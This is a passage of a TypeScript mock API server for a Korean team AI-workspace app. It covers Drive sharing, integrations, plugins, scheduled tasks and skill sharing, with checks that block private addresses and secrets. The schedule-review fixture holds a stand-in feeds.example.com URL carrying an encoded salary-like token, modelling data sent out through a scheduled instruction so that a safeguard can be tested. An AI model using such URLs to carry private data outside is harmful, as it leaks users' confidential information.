      ? { configured: false, status: 'disabled', account: null, scopes: [], expiresAt: null, personalAllowed: this.driveMembers, teamShares: [] }
      : { configured: true, status: 'disconnected', account: null, scopes: [], expiresAt: null, personalAllowed: this.driveMembers,
          teamShares: this.driveShares.filter((x) => x.status === 'connected' && this.driveShareCovers(x, c.user)).map((x) => ({ id: x.id, name: x.name, folders: x.folders, wholeDrive: x.wholeDrive })) }),
    authorizeDrive: () => {
      if (!this.driveMembers) fail('forbidden', 403, 'drive_members_off')
      return { flowId: 'personal-flow', authorizationUrl: 'https://accounts.google.com/o/oauth2/v2/auth?state=synthetic', expiresAt: new Date(Date.now() + 600_000).toISOString() }
    },
    // the share sign-in (mock Google): pending once, then the synthetic account is back
    driveFlow: (c) => {
      const f = this.driveShareFlow
      if (!f || f.id !== c.params.id) fail('not_found', 404, 'drive_not_found')
      return { flowId: f!.id, state: f!.polls++ < 1 ? 'pending' : 'ready', account: { name: 'Admin Fixture', email: 'drive-admin@example.test' }, expiresAt: new Date(Date.now() + 600_000).toISOString(), reason: null }
    },
    cancelDriveFlow: () => { this.driveShareFlow = null; return undefined },
    setDriveMembers: (c) => { this.driveMembers = c.body.on; return this.driveAdminStatus() },
    listDriveShares: () => ({ items: this.driveShares.map((x) => ({ ...x, usedBy: this.driveShareUsers(x) })) }),
    authorizeDriveShare: (c) => {
      this.driveShareFlow = { id: 'share-flow-' + uuidv7(), shareId: c.body.shareId ?? null, polls: 0 }
      return { flowId: this.driveShareFlow.id, authorizationUrl: 'https://accounts.google.com/o/oauth2/v2/auth?state=synthetic-share', expiresAt: new Date(Date.now() + 600_000).toISOString() }
    },
    completeDriveShareFlow: (c) => {
      const f = this.driveShareFlow
      if (!f || f.id !== c.params.id) fail('not_found', 404, 'drive_not_found')
      this.driveShareFlow = null
      const at = now(), me = { id: c.user.id, name: c.user.name }
      if (f!.shareId) {
        const x = this.driveShares.find((y) => y.id === f!.shareId)
        if (!x) fail('not_found', 404, 'drive_not_found')
        Object.assign(x!, { status: 'connected', reason: null, owner: me, updatedAt: at })
        return { ...x!, usedBy: this.driveShareUsers(x!) }
      }
      const name = (c.body.name ?? '').trim() || 'Company Drive'
      if (this.driveShares.some((y) => y.name.toLowerCase() === name.toLowerCase())) fail('conflict', 409, 'drive_name_taken')
      const x: MockDriveShare = { id: uuidv7(), name, account: { name: 'Admin Fixture', email: 'drive-admin@example.test' }, owner: me, folders: [], wholeDrive: false,
        access: { everyone: false, groups: [], users: [] }, status: 'connected', reason: null, usedBy: 0, createdAt: at, updatedAt: at }
      this.driveShares.push(x)
      return x
    },
    driveShareFolders: (c) => {
      const q = (c.query.q ?? '').trim().toLowerCase()
      const all = q ? [...this.driveTopFolders(), ...DRIVE_SUBFOLDERS] : this.driveTopFolders()
      return { items: all.filter((f) => !q || f.name.toLowerCase().includes(q)) }
    },
    updateDriveShare: (c) => {
      const x = this.driveShares.find((y) => y.id === c.params.id)
      if (!x) fail('not_found', 404, 'drive_not_found')
      const b = c.body
      if (b.name !== undefined && this.driveShares.some((y) => y.id !== x!.id && y.name.toLowerCase() === b.name!.trim().toLowerCase())) fail('conflict', 409, 'drive_name_taken')
      const known = [...this.driveTopFolders(), ...DRIVE_SUBFOLDERS]
      if (b.folders && b.folders.some((id: string) => !known.some((f) => f.id === id))) fail('bad_request', 400, 'drive_folder_invalid')
      if (b.name !== undefined) x!.name = b.name.trim()
      if (b.wholeDrive !== undefined) x!.wholeDrive = b.wholeDrive
      if (b.folders) x!.folders = x!.wholeDrive ? [] : b.folders.map((id: string) => known.find((f) => f.id === id)!)
      if (b.access) x!.access = b.access
      x!.updatedAt = now()
      return { ...x!, usedBy: this.driveShareUsers(x!) }
    },
    stopDriveShare: (c) => {
      if (!this.driveShares.some((y) => y.id === c.params.id)) fail('not_found', 404, 'drive_not_found')
      this.driveShares = this.driveShares.filter((y) => y.id !== c.params.id)
      return { stopped: true, revocation: 'revoked' }
    },
    // Admin › App connectors (integrations/google-drive/admin-setup.ts): this test server has a public address, so an
    // admin can set Google up; a file must list the redirect URI, like the real server checks.
    driveAdminStatus: () => this.driveAdminStatus(),
    setDriveClient: (c) => {
      const redirect = this.driveAdminStatus().redirectUri!
      if (c.body.file !== undefined) {
        let j: { web?: { redirect_uris?: unknown } } | null = null
        try { j = JSON.parse(c.body.file) } catch { fail('bad_request', 400, 'drive_client_invalid') }
        if (!j?.web) fail('bad_request', 400, 'drive_client_invalid')
        if (!Array.isArray(j!.web!.redirect_uris) || !j!.web!.redirect_uris.includes(redirect)) fail('bad_request', 400, 'drive_client_redirect')
      }
      this.driveClient = 'app'
      return this.driveAdminStatus()
    },

    // ---------------- external services (like server/src/routes/integrations.ts) ----------------
    listIntegrations: (c) => ({
      items: this.integrations.filter((x) => this.integrationAllows(x, c.user)).map((x) => this.integrationView(x, c.user)),
      personalAllowed: this.settings.personalIntegrations,
    }),
    createIntegration: (c) => {
      if (!this.settings.personalIntegrations) fail('forbidden', 403, '팀에서 개인 연결을 꺼 두었어요.')
      if (c.body.access) fail('validation', 400, '사용할 사람은 팀 연결에만 정해요.', { 'body.access': 'team connections only' })
      return { status: 201, body: this.addIntegration(c.user, c.body, 'personal') }
    },
    updateIntegration: (c) => this.patchIntegration(c.user, c.params.id, c.body),
    deleteIntegration: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      this.integrations = this.integrations.filter((y) => y.id !== x.id)
      this.integrationSecrets.delete(x.id)
      return undefined
    },
    // like server/src/integrations/connections/service.ts setTool: whoever manages it, a tool the service lists
    setIntegrationTool: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      if (x.kind !== 'mcp' || !x.tools.some((t) => t.name === c.body.name)) fail('validation', 400, '이 서비스가 지금 알려 준 도구 목록에 없는 도구예요.', { 'body.name': 'unknown tool' })
      x.disabledTools = c.body.enabled ? x.disabledTools.filter((n) => n !== c.body.name) : [...new Set([...x.disabledTools, c.body.name])]
      x.tools = x.tools.map((t) => ({ ...t, enabled: !x.disabledTools.includes(t.name) }))
      return this.integrationView(x, c.user)
    },
    refreshIntegration: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      this.checkIntegration(x)
      x.updatedAt = now()
      return this.integrationView(x, c.user)
    },
    authorizeIntegration: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      if (x.kind !== 'mcp' || x.auth !== 'oauth') fail('conflict', 409, '이 연결은 로그인을 쓰지 않아요.')
      const flow: IntegrationFlow = { flowId: uuidv7(), state: 'pending', expiresAt: new Date(Date.now() + 10 * 60_000).toISOString(), reason: null }
      this.integrationFlows.set(flow.flowId, { flow, integrationId: x.id, userId: c.user.id, polls: 0 })
      return { flowId: flow.flowId, authorizationUrl: `https://auth.example.test/authorize?client_id=mock&state=${flow.flowId}`, expiresAt: flow.expiresAt }
    },
    integrationFlow: (c) => {
      const f = this.integrationFlows.get(c.params.id)
      if (!f || f.userId !== c.user.id) return fail('not_found', 404)
      // the person finishes at the service by the second poll: the server has the tokens and checks the connection
      if (f.flow.state === 'pending' && ++f.polls >= 2) {
        const x = this.integrations.find((y) => y.id === f.integrationId)
        if (!x) Object.assign(f.flow, { state: 'failed', reason: '연결이 지워졌어요.' })
        else {
          this.integrationSecrets.set(x.id, 'oauth-tokens')
          x.account = `${c.user.username}@example.test`
          this.checkIntegration(x)
          f.flow.state = 'completed'
          // made from an admin's request: connected now that the member signed in
          for (const r of this.integrationRequests) if (r.integrationId === x.id && this.requestState(r) === 'waiting') Object.assign(r, { state: 'connected', endedAt: now() })
        }
      }
      return f.flow
    },
    listTeamIntegrations: (c) => ({ items: this.integrations.filter((x) => x.scope === 'team').map((x) => this.integrationView(x, c.user)) }),
    // like server/src/integrations/connections/requests.ts: only the member asked sees or answers a request; no key in it
    listIntegrationRequests: (c) => ({ items: this.integrationRequests.filter((r) => r.user.id === c.user.id && this.requestState(r) === 'waiting').map((r) => this.requestView(r)) }),
    getIntegrationRequest: (c) => this.requestView(this.myRequest(c.user, c.params.id)),
    completeIntegrationRequest: (c) => {
      const r = this.waitingRequest(this.myRequest(c.user, c.params.id))
      if (r.auth !== 'oauth' && !c.body.secret) fail('validation', 400, '키가 아직 없어요. 키를 넣어 주세요.', { 'body.secret': 'required' })
      const made = r.integrationId ? this.integrations.find((x) => x.id === r.integrationId && x.ownerId === c.user.id) : undefined
      if (r.auth === 'oauth' && made) return this.integrationView(made, c.user)
      if (!this.settings.personalIntegrations) fail('forbidden', 403, '팀에서 개인 연결을 꺼 두었어요.')
      const i = this.addIntegration(c.user, { kind: r.kind, name: r.name, url: r.url, auth: r.auth, authHeader: r.authHeader, notes: r.notes, writePolicy: c.body.writePolicy ?? 'ask', ...(c.body.secret ? { secret: c.body.secret } : {}) }, 'personal')
      r.integrationId = i.id
      if (r.auth !== 'oauth') Object.assign(r, { state: 'connected', endedAt: now() })
      return i
    },
    declineIntegrationRequest: (c) => {
      const r = this.waitingRequest(this.myRequest(c.user, c.params.id))
      Object.assign(r, { state: 'declined', endedAt: now() })
      return this.requestView(r)
    },
    listTeamIntegrationRequests: () => ({ items: [...this.integrationRequests].reverse().sort((a, b) => Number(this.requestState(b) === 'waiting') - Number(this.requestState(a) === 'waiting')).map((r) => this.requestView(r)) }),
    createIntegrationRequest: (c) => {
      if (!this.settings.personalIntegrations) fail('conflict', 409, '지금은 직원이 개인 연결을 추가할 수 없어요.')
      const member = this.users.find((u) => u.id === c.body.userId && u.status === 'active') ?? fail('validation', 400, '이 팀에서 쓰고 있는 계정이 아니에요.', { 'body.userId': 'not an active account' })
      if (privateHost(new URL(c.body.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
      if (this.integrationRequests.some((r) => r.user.id === member.id && r.url === c.body.url && this.requestState(r) === 'waiting')) fail('conflict', 409, '이 사람에게 같은 주소로 보낸 요청이 아직 기다리고 있어요.')
      const at = Date.now()
      const r: IntegrationRequest & { integrationId: string | null } = {
        id: uuidv7(), kind: c.body.kind, name: c.body.name, url: c.body.url, auth: c.body.auth, authHeader: c.body.auth === 'header' ? c.body.authHeader ?? null : null,
        notes: c.body.kind === 'http' ? c.body.notes ?? null : null, user: { id: member.id, name: member.name }, requestedBy: { id: c.user.id, name: c.user.name },
        state: 'waiting', createdAt: new Date(at).toISOString(), expiresAt: new Date(at + 7 * 86_400_000).toISOString(), endedAt: null, link: '', integrationId: null,
      }
      this.integrationRequests.push(r)
      return { status: 201, body: this.requestView(r) }
    },
    withdrawIntegrationRequest: (c) => {
      const r = this.waitingRequest(this.integrationRequests.find((x) => x.id === c.params.id) ?? fail('not_found', 404))
      Object.assign(r, { state: 'withdrawn', endedAt: now() })
      return this.requestView(r)
    },
    // like server/src/integrations/connections/templates.ts: no key in a template; only members it is for see or connect it
    listIntegrationTemplates: (c) => ({
      items: this.integrationTemplates.filter((t) => this.templateCovers(t, c.user)).map((t) => {
        const mine = this.integrations.find((x) => x.templateId === t.id && x.ownerId === c.user.id)
        const { access: _a, createdAt: _c, updatedAt: _u, ...rest } = t
        return { ...rest, url: new URL(t.url).origin + new URL(t.url).pathname, connection: mine ? this.integrationView(mine, c.user) : null }
      }),
    }),
    connectIntegrationTemplate: (c) => {
      const t = this.integrationTemplates.find((x) => x.id === c.params.id && this.templateCovers(x, c.user)) ?? fail('not_found', 404, '이 템플릿은 나에게 공유되지 않았어요.')
      // the template as the member saw it: changed since, 409 (templates.ts connect)
      if (c.body.version !== t.version) fail('conflict', 409, '이 템플릿이 바뀌었어요. 다시 확인하고 연결해 주세요.')
      if (t.auth !== 'oauth' && !c.body.secret) fail('validation', 400, '키가 아직 없어요. 키를 넣어 주세요.', { 'body.secret': 'required' })
      const mine = this.integrations.find((x) => x.templateId === t.id && x.ownerId === c.user.id)
      if (mine) {
        if (c.body.secret) { this.integrationSecrets.set(mine.id, c.body.secret); this.checkIntegration(mine) }
        if (c.body.writePolicy) mine.writePolicy = c.body.writePolicy
        return this.integrationView(mine, c.user)
      }
      return this.addIntegration(c.user, { kind: t.kind, name: t.name, url: t.url, auth: t.auth, authHeader: t.authHeader, notes: t.notes, writePolicy: c.body.writePolicy ?? 'ask', ...(c.body.secret ? { secret: c.body.secret } : {}) }, 'personal', t.id)
    },
    listTeamIntegrationTemplates: () => ({ items: [...this.integrationTemplates].sort((a, b) => a.name.localeCompare(b.name)).map((t) => this.templateView(t)) }),
    createIntegrationTemplate: (c) => {
      if (privateHost(new URL(c.body.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
      const t = {
        id: uuidv7(), kind: c.body.kind, name: c.body.name, url: c.body.url, auth: c.body.auth, authHeader: c.body.auth === 'header' ? c.body.authHeader ?? null : null,
        notes: c.body.notes ?? null, access: c.body.access ?? { everyone: true, groups: [], users: [] }, createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), updatedAt: now(), version: 1,
      }
      this.integrationTemplates.push(t)
      return { status: 201, body: this.templateView(t) }
    },
    updateIntegrationTemplate: (c) => {
      const t = this.integrationTemplates.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const auth = c.body.auth ?? t.auth
      const authHeader = auth === 'header' ? (c.body.authHeader !== undefined ? c.body.authHeader : t.authHeader) : null
      const moved = (c.body.url !== undefined && c.body.url !== t.url) || auth !== t.auth || authHeader !== t.authHeader
      Object.assign(t, { ...(c.body.name !== undefined ? { name: c.body.name } : {}), ...(c.body.url !== undefined ? { url: c.body.url } : {}), auth, authHeader, ...(c.body.notes !== undefined ? { notes: c.body.notes } : {}), ...(c.body.access ? { access: c.body.access } : {}), updatedAt: now(), version: t.version + 1 })
      // a new address or sign-in method drops every member's key; a member it no longer covers loses theirs
      for (const x of this.integrations.filter((y) => y.templateId === t.id)) {
        if (moved || !this.templateCovers(t, this.users.find((u) => u.id === x.ownerId)!)) { this.integrations = this.integrations.filter((y) => y.id !== x.id); this.integrationSecrets.delete(x.id) }
        else Object.assign(x, { name: t.name, notes: t.notes })
      }
      return this.templateView(t)
    },
    // like templates.ts members: who it is for, connected (when) / not connected / key stopped working; never a key
    listIntegrationTemplateMembers: (c) => {
      const t = this.integrationTemplates.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      return {
        items: this.users.filter((u) => u.status === 'active' && this.templateCovers(t, u)).sort((a, b) => a.name.localeCompare(b.name)).map((u) => {
          const x = this.integrations.find((y) => y.templateId === t.id && y.ownerId === u.id)
          if (!x || !this.integrationSecrets.has(x.id)) return { user: { id: u.id, name: u.name }, state: 'not_connected' as const, since: null }
          return { user: { id: u.id, name: u.name }, state: x.status === 'needs_auth' ? 'stopped' as const : x.status === 'error' ? 'error' as const : 'connected' as const, since: x.createdAt }
        }),
      }
    },
    deleteIntegrationTemplate: (c) => {
      if (!this.integrationTemplates.some((x) => x.id === c.params.id)) fail('not_found', 404)
      this.integrationTemplates = this.integrationTemplates.filter((x) => x.id !== c.params.id)
      for (const x of this.integrations.filter((y) => y.templateId === c.params.id)) this.integrationSecrets.delete(x.id)
      this.integrations = this.integrations.filter((y) => y.templateId !== c.params.id)
      return undefined
    },

    // Admin > Plugins (web/test/mock/plugins.ts)
    listPlugins: (c) => this.plugins.list(c.user.locale ?? 'ko', this.settings.defaultLocale),
    inspectPluginFile: (c) => {
      const r = this.plugins.inspectFile(c.file!.name, c.user.id, c.user.locale ?? 'ko')
      if ('reason' in r) throw new Fail('validation', 400, undefined, undefined, { reason: r.reason })
      return r
    },
    inspectPluginSource: (c) => {
      const r = c.body.source === 'catalog' ? this.plugins.inspectCatalog(c.body.id, c.user.id, c.user.locale ?? 'ko') : { reason: 'import_missing' }
      if ('reason' in r) throw new Fail('conflict', 409, undefined, undefined, { reason: r.reason })
      return r
    },
    installPlugin: (c) => {
      const r = this.plugins.install(c.body.token, c.body.manifestSha256, c.body.enable, { id: c.user.id, name: c.user.name })
      if ('reason' in r) throw new Fail(r.status === 410 ? 'gone' : 'conflict', r.status, undefined, undefined, { reason: r.reason })
      return { status: 201, body: r }
    },
    enablePlugin: (c) => this.plugins.set(c.params.id, true) ?? fail('not_found', 404),
    disablePlugin: (c) => this.plugins.set(c.params.id, false) ?? fail('not_found', 404),
    rollbackPlugin: () => { throw new Fail('conflict', 409, undefined, undefined, { reason: 'no_rollback' }) },
    uninstallPlugin: (c) => { if (!this.plugins.remove(c.params.id)) fail('not_found', 404); return undefined },
    createTeamIntegration: (c) => ({ status: 201, body: this.addIntegration(c.user, c.body, 'team') }),

    // nothing connected, no scheduled tasks yet
    listConnected: () => ({ items: [] }),
    listSchedules: (c) => ({ items: this.schedules.filter((x) => x.userId === c.user.id).map(({ userId: _, ...x }) => x), timeZone: 'Asia/Seoul' }),
    updateSchedule: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (c.body.enabled && x.needsReview) throw new Fail('conflict', 409, '이 예약 작업은 확인 카드 없이 만들어져서 멈춰 뒀어요.', undefined, { reason: 'schedule_review' })
      x.enabled = c.body.enabled
      const { userId: _, ...out } = x
      return out
    },
    deleteSchedule: (c) => { this.schedules = this.schedules.filter((y) => !(y.id === c.params.id && y.userId === c.user.id)); return undefined },
    // like server/src/chat/schedules.ts runNow: a new chat now; the schedule and on/off stay
    runScheduleNow: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (x.needsReview) throw new Fail('conflict', 409, '이 예약 작업은 확인 카드 없이 만들어져서 멈춰 뒀어요.', undefined, { reason: 'schedule_review' })
      if (/budget/.test(x.title)) fail('budget_exceeded', 429, '오늘 AI 사용 한도를 다 썼어요. 내일 오전 12:00부터 다시 쓸 수 있어요. 더 필요하면 관리자에게 말해 주세요.')
      const chat: Chat = { id: uuidv7(), projectId: x.projectId, title: `${x.title} · ${now().slice(0, 10)}`, engine: 'claude-code', model: null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle' }
      this.chats.push(chat)
      this.publish({ type: 'chat.updated', data: { chatId: chat.id, change: 'created', chat } })
      x.lastChatId = chat.id
      x.lastOutcome = 'done'
      const { userId: _, ...out } = x
      return { schedule: out, chatId: chat.id }
    },
    // like server/src/chat/schedule-edit.ts: the checks of schedule_create, then the same card; only its answer saves
    scheduleEditCard: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      return { request: this.scheduleEditRequest(x, c.body) }
    },
    editSchedule: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (c.body.kind === 'template') {
        if (!x.templateId) throw new Fail('conflict', 409, undefined, undefined, { reason: 'schedule_not_template' })
        if (!String(c.body.outputPath).startsWith(`users/${c.user.id}`)) fail('not_found', 404)
        Object.assign(x, { time: c.body.time, weekday: x.repeat === 'weekly' ? c.body.weekday : null, sourcePath: c.body.sourcePath, outputPath: c.body.outputPath })
      } else {
        const r = this.scheduleEditRequest(x, c.body)
        if (c.body.requestId !== r.requestId) throw new Fail('conflict', 409, '예약 작업이나 연결 서비스가 그 사이에 바뀌었어요. 카드를 다시 확인해 주세요.', undefined, { reason: 'schedule_card_changed' })
        if (!r.options.some((o) => o.value === c.body.answer)) fail('validation', 400, '이 확인은 카드의 버튼으로만 답할 수 있어요.')
        if (c.body.answer !== 'cancel') Object.assign(x, { title: c.body.title.trim(), prompt: c.body.prompt.trim(), repeat: c.body.repeat, time: c.body.time, weekday: c.body.weekday ?? null, day: c.body.day ?? null, date: c.body.date ?? null,
          projectId: c.body.projectId, needsReview: false, reviewSince: null })
      }
      const { userId: _, ...out } = x
      return out
    },
    // like server/src/chat/schedule-review.ts: the schedule card again, with the whole instruction and its addresses
    getScheduleReview: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (!x.needsReview) throw new Fail('conflict', 409, undefined, undefined, { reason: 'schedule_not_waiting' })
      const url = 'https://feeds.example.com/r/c2fsyxj5ltk4nzy1ndmy'
      return { request: {
        kind: 'ask_user' as const, origin: 'server' as const, requestId: `schedule-review-${x.id}`, allowText: false, multiple: false,
        question: `이 예약 작업은 확인 카드 없이 만들어져서 멈춰 뒀어요. 예약 작업은 아무도 지켜보지 않을 때 아래 지시문을 그대로 실행해요. 지시문과 주소를 확인하고 다시 켤지 골라 주세요.\n\n제목: ${x.title}\n일정: 매일 09:00\n\n실행할 때마다 아래 주소 1개는 묻지 않고 열어요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.`,
        options: [{ label: '다시 켜기', value: 'resume' }, { label: '계속 멈춰 두기', value: 'keep' }],
        details: [{ label: '지시문', text: x.prompt, marks: ['c2fsyxj5ltk4nzy1ndmy'] }, { label: '실행 때 묻지 않고 여는 주소', text: url, marks: ['c2fsyxj5ltk4nzy1ndmy'] }],
      } }
    },
    confirmScheduleReview: (c) => {
      const x = this.schedules.find((y) => y.id === c.params.id && y.userId === c.user.id) ?? fail('not_found', 404)
      if (c.body.answer !== 'resume' && c.body.answer !== 'keep') fail('validation', 400, '이 확인은 카드의 버튼으로만 답할 수 있어요.')
      if (c.body.requestId !== `schedule-review-${x.id}`) throw new Fail('conflict', 409, '예약 작업이나 연결 서비스가 그 사이에 바뀌었어요. 카드를 다시 확인해 주세요.', undefined, { reason: 'schedule_card_changed' })
      if (c.body.answer === 'resume') Object.assign(x, { needsReview: false, reviewSince: null, enabled: true, nextRunAt: new Date(Date.now() + 86400_000).toISOString() })
      const { userId: _, ...out } = x
      return out
    },
    listSchedulesAwaitingReview: () => ({ items: this.schedules.filter((x) => x.needsReview).map((x) => ({
      id: x.id, user: { id: x.userId, name: this.users.find((u) => u.id === x.userId)?.name ?? x.userId }, repeat: x.repeat, time: x.time, weekday: x.weekday, day: x.day, date: x.date, reviewSince: x.reviewSince ?? null,
    })) }),
    listScheduleTemplates: () => ({ items: [{ id: 'daily-file-index', version: 1, repeat: 'daily' }, { id: 'weekly-summary', version: 1, repeat: 'weekly' }], timeZone: 'Asia/Seoul' }),
    listNotifications: () => ({ items: [], nextCursor: null, unreadCount: 0 }),
    getNotificationPreferences: () => this.notifyPrefs,
    // the server's rule for the older apps' roomMessages (server/src/notifications/preferences.ts savePreferences)
    updateNotificationPreferences: (c) => {
      const b = c.body
      const level = b.roomLevel ?? (b.roomMessages === false ? 'none' : b.roomMessages === true && this.notifyPrefs.roomLevel === 'none' ? 'direct' : this.notifyPrefs.roomLevel)
      this.notifyPrefs = { ...this.notifyPrefs, ...b, roomLevel: level, roomMessages: level !== 'none', quietHours: b.quietHours ?? this.notifyPrefs.quietHours, roomThreadReplies: b.roomThreadReplies ?? this.notifyPrefs.roomThreadReplies }
      return this.notifyPrefs
    },
    getPushSettings: () => ({ configured: false, enabled: false, publicKey: null, subscriptionId: null }),
    // ---------------- 내 스킬 가져오기 (shared/src/api/skill-shares.ts, docs/DECISIONS.md "SK") ----------------
    // The team connector is on here (GET /api/connectors/remote: configured, at this server's /mcp), so the welcome
    // step shows its Claude Code line. A share proposal is a fixed, realistic one whatever was sent (the server's
    // checks and AI are not mocked): 10 candidates from a folder (3 recommended: one with a file, one similar to a team
    // skill and merged by default; 4 other: personal, a personal path, two dev; 3 excluded: a secret, scripts, a
    // plugin), a CLAUDE.md rule of 5 lines with 12 dropped; from Claude Code (POST with source "claude_code", as the
    // share_skills tool would) 12 candidates from 2 projects and two tools. It reads `checking` (every row unjudged)
    // for the first two reads and `ready` from the third. Applying writes the ticked skills as team skills, opens a
    // chat for a merge and records the welcome progress's shared skills. The proposals belong to the server's
    // generation, so /__test/reset clears them.
    ...((): Partial<Record<ApiName, Handler>> => {
      type Share = import('@mycel/shared/api').SkillShare
      type Cand = import('@mycel/shared/api').ShareCandidate
      // group: the group it goes to (docs/DECISIONS.md "Group skills"), null for the team
      type Row = { share: Share; owner: string; reads: number; group: string | null }
      const self = this as unknown as { skillShareState?: { gen: number; rows: Row[] } }
      const rows = (): Row[] => {
        if (self.skillShareState?.gen !== this.generation) self.skillShareState = { gen: this.generation, rows: [] }
        return self.skillShareState.rows
      }
      /** a member of a group with a folder of its own (the groups Admin › Groups made): they write its skills */
      const writes = (u: User, groupId: string) => this.groupSkillRoots(u).some((g) => g.id === groupId)
      // the proposer's own; a share to a group also for its members who may write its skills (server: share.ts ownRow)
      const mine = (c: Ctx) => rows().find((r) => r.share.id === c.params.id && (r.owner === c.user.id || (r.group !== null && writes(c.user, r.group)))) ?? fail('not_found', 404)
      /** what the caller reads of a share: where it goes, who proposed it, whether they may apply it */
      const forCaller = (r: Row, s: Share, u: User): Share => {
        const g = r.group ? this.groups.find((x) => x.id === r.group) : null
        const own = r.owner === u.id
        const open = s.status === 'checking' || s.status === 'ready'
        return {
          ...s, targetGroup: r.group ? { id: r.group, name: g?.name ?? null } : null,
          proposer: { id: r.owner, name: this.users.find((x) => x.id === r.owner)?.name ?? r.owner }, mine: own,
          canApply: r.group ? writes(u, r.group) : own, targets: own && open ? this.groupSkillRoots(u).map((x) => ({ id: x.id, name: x.name })) : [],
        }
      }
      const cand = (name: string, title: string, group: Cand['group'], reason: Cand['reason'], o: Partial<Cand> = {}): Cand => ({
        name, title, description: `${title} — ${name}`, origin: 'user', project: null, group, reason, detail: null, personalPath: false,
        files: group === 'excluded' ? [] : [{ path: 'SKILL.md', bytes: 1200 }], scriptsDropped: 0, sameName: null, similar: null, action: 'add', applied: null, ...o,
      })
      const fixture = (cc: boolean): Cand[] => [
        cand('weekly-report', '주간 업무 보고', 'recommended', 'team_any'),
        cand('quote-draft', '견적서 초안', 'recommended', 'with_file', { detail: '견적 양식', files: [{ path: 'SKILL.md', bytes: 1400 }, { path: 'templates/견적 양식.md', bytes: 2100 }] }),
        cand('meeting-notes', '회의록 정리', 'recommended', 'similar', { detail: '할 일 정리', similar: { path: GENERAL_TASKS_SKILL, title: '할 일 정리' }, action: 'merge' }),
        cand('my-schedule', '내 일정 정리', 'other', 'personal'),
        cand('vendor-mail', '거래처 메일', 'other', 'personal_path', { personalPath: true }),
        cand('commit-message', '커밋 메시지', 'other', 'dev'),
        cand('pr-review', 'PR 리뷰', 'other', 'dev', { scriptsDropped: 1 }),
        ...(cc ? [cand('standup', '스탠드업 메모', 'other', 'personal', { origin: 'project', project: 'acme-web' }), cand('api-docs', 'API 문서', 'other', 'dev', { origin: 'project', project: 'acme-api' })] : []),
        cand('slack-notify', '슬랙 알림', 'excluded', 'secret', { detail: 'slack' }),
        cand('deploy', '배포하기', 'excluded', 'scripts'),
        cand('frontend-design', 'frontend-design', 'excluded', 'plugin', { origin: 'plugin' }),
      ]
      /** what a read shows: unjudged while checking */
      const view = (r: Row): Share => r.share.status !== 'checking' ? r.share
        : { ...r.share, candidates: r.share.candidates.map((x) => (x.group === 'excluded' ? x : { ...x, group: 'other', reason: 'unjudged', detail: null, action: x.sameName ? 'merge' : 'add' })) }
      const read = (r: Row): Share => {
        if (r.share.status === 'checking' && ++r.reads > 2) r.share = { ...r.share, status: 'ready', ai: 'done' }
        return view(r)
      }
      const skillText = (name: string, title: string) => `---\nname: ${name}\ndescription: ${title}\nmetadata:\n  title: ${title}\n---\n# ${title}\n`
      const put = (path: string, text: string) => {
        for (let d = path.lastIndexOf('/'); d > 0; d = path.lastIndexOf('/', d - 1)) this.files.set(path.slice(0, d), this.files.get(path.slice(0, d)) ?? { type: 'folder', mtime: now() })
        this.putFile(path, text)
      }
      return {
        listRemoteConnectors: (c) => ({ configured: true, resource: `${new URL(c.req.url).origin}/mcp`, items: [] }),
        createSkillShare: (c) => {
          const b = c.body as import('@mycel/shared/api').CreateSkillShare
          const cc = b.source === 'claude_code' || b.source === 'codex'
          const at = now()
          const share: Share = {
            id: uuidv7(), source: b.source, app: b.source === 'codex' ? 'codex' : b.app ?? 'claude', status: 'checking', where: cc ? null : b.where ?? '.claude', projects: cc ? b.projects ?? 2 : null,
            createdAt: at, updatedAt: at, expiresAt: new Date(Date.now() + 7 * 86400_000).toISOString(), ai: 'pending', candidates: fixture(cc),
            rule: { lines: 5, dropped: 12, path: null, text: '- 보고서는 결론부터 짧게 써요\n- 숫자는 표로 정리해요\n- 고객 이름은 회사 공식 표기를 따라요\n- 일정은 YYYY-MM-DD로 적어요\n- 모르면 추측하지 말고 물어봐요' },
            tools: cc ? [{ name: 'Notion', url: 'https://mcp.notion.com/mcp', auth: 'oauth', header: null, templateId: null, error: null }, { name: 'Linear', url: 'https://mcp.linear.app/mcp', auth: 'oauth', header: null, templateId: null, error: null }] : [],
            landing: null,
          }
          const group = b.group ?? null
          if (group && !writes(c.user, group)) fail('validation', 400, '이 그룹의 스킬 폴더에 넣을 수 있는 그룹 멤버만 할 수 있어요.')
          const r: Row = { share, owner: c.user.id, reads: 0, group }
          rows().push(r)
          return forCaller(r, view(r), c.user)
        },
        listSkillShares: (c) => ({
          items: rows().filter((r) => (c.query.scope === 'review'
            ? r.owner !== c.user.id && r.group !== null && writes(c.user, r.group) && (r.share.status === 'checking' || r.share.status === 'ready')
            : r.owner === c.user.id) && (!c.query.status || r.share.status === c.query.status) && (!c.query.source || r.share.source === c.query.source))
            .slice().reverse().map((r) => forCaller(r, read(r), c.user)),
        }),
        getSkillShare: (c) => { const r = mine(c); return forCaller(r, read(r), c.user) },
        setSkillShareTarget: (c) => {
          const r = rows().find((x) => x.share.id === c.params.id && x.owner === c.user.id) ?? fail('not_found', 404)
          const to = (c.body as { group: string | null }).group
          if (to && !writes(c.user, to)) fail('validation', 400, '이 그룹의 스킬 폴더에 넣을 수 있는 그룹 멤버만 할 수 있어요.')
